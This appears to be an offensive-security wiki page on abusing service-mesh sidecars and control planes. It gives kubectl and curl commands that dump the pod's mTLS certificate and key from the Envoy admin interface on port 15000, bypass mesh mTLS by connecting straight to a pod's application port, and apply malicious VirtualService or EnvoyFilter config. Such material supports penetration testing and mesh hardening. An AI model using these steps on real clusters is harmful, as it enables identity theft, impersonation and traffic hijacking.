---
title: "Service mesh abuse: turning sidecars and the mesh control plane against traffic"
description: "A service mesh injects a sidecar proxy into pods and routes traffic through it under a control plane. Attackers abuse this by reading the sidecar's issued identity and certificates, reaching the proxy admin interface, pushing malicious routing or filters through the control plane, and exploiting the mesh's own bypass paths to defeat the authentication and encryption it is meant to add."
keywords:
  - service mesh
  - istio
  - envoy sidecar
  - mtls
  - control plane
---

# Service mesh abuse

A service mesh such as Istio or Linkerd adds a sidecar proxy (commonly Envoy) to each pod and routes the pod's traffic through it, with a control plane distributing configuration, identities, and mutual-TLS certificates. The mesh is meant to add authentication, encryption, and policy, but it also adds surface. The sidecar holds the pod's mesh identity and certificates, exposes an admin interface, and obeys configuration pushed by the control plane, so an attacker reads the identity, reaches the admin port, or pushes malicious routing and filters, and exploits the paths that bypass the mesh to defeat its controls entirely.

Detect the mesh and inspect the sidecar:

```bash
kubectl get pods -A -o jsonpath='{..image}' | tr ' ' '\n' | grep -iE 'istio|envoy|linkerd' | sort -u
# the Envoy sidecar admin interface is typically on localhost:15000
curl -s http://127.0.0.1:15000/server_info | head
curl -s http://127.0.0.1:15000/certs                   # the pod's mesh certificates/keys
curl -s http://127.0.0.1:15000/config_dump | head      # the full proxy config and routes
```

## Routes

```bash
# 1. steal the pod's mesh identity and private key from the sidecar admin or SDS
curl -s http://127.0.0.1:15000/certs                   # mTLS cert + key the pod uses
# 2. bypass the mesh: talk to a target pod's app port directly, skipping the sidecar
#    (mesh policy is enforced by the proxy; a direct connection to the real pod IP
#     on the app port, where the app also listens, evades mTLS and authz)
curl -s http://<target-pod-ip>:<app-port>/
# 3. with control-plane access (Istio CRDs via the API), push malicious config:
#    a VirtualService re-routing traffic, or an EnvoyFilter injecting a Lua filter
kubectl apply -f malicious-virtualservice.yaml 2>/dev/null
```

## Exploitation notes

- The sidecar admin interface (Envoy on 15000) is a rich local target from a compromised pod: `/certs` yields the pod's mesh identity and key, and `/config_dump` maps every route and policy.
- Mesh mTLS and authorization are enforced by the proxy, so a direct connection to a target's real application port bypasses them where the app itself does not also require the mesh identity; this defeats the mesh's access control.
- Control-plane access through the mesh CRDs (VirtualService, EnvoyFilter, AuthorizationPolicy) lets an attacker reroute traffic, inject request filters, or disable policy cluster-wide; it requires RBAC to write those objects, so it chains from the escalation routes.
- Stealing the sidecar certificate lets an attacker impersonate the pod's mesh identity to other services that trust it.

## References

- [Istio: security architecture](https://istio.io/latest/docs/concepts/security/)
- [Envoy: admin interface](https://www.envoyproxy.io/docs/envoy/latest/operations/admin)
- [Linkerd: security](https://linkerd.io/2/features/automatic-mtls/)
